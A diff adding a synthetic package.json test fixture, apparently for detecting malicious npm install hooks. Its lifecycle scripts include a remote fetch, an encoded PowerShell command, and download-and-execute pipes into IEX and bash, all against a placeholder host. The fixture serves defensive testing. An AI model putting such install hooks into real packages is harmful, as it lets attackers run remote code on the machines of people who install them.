@@ -1,0 +1,10 @@
+{
+  "//": "SYNTHETIC TEST FIXTURE — not functional",
+  "name": "fixture",
+  "scripts": {
+    "preinstall": "node -e \"require('https').get('https://example.invalid/p')\"",
+    "install": "{{POWERSHELL}} -NoProfile {{ENC_FLAG}} ZWNobyBoaQ==",
+    "postinstall": "{{POWERSHELL}} -c \"iwr https://example.invalid/a.ps1 | {{IEX}}\"",
+    "prepare": "{{WGET}} -qO- https://example.invalid/a | bash"
+  }
+}
